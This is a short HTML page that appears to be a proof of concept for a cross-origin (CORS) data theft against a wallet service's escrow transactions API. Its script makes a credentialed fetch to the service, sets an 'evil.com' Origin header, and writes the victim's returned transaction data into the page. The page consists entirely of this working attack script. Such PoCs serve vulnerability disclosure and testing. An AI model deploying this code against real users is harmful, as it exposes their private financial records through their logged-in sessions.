<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("https://walletbot.me/scwapi/escrow/transactions/", {
        credentials: "include",
        mode: "cors",
        headers: {
          "Origin": "https://evil.com"
        }
      })
      .then(res => res.text())
      .then(data => {
        console.log("Fetched:", data);
        document.write("<pre>" + data + "</pre>");
      })
      .catch(err => console.error("Fetch failed:", err));
    </script>
  </body>
</html>
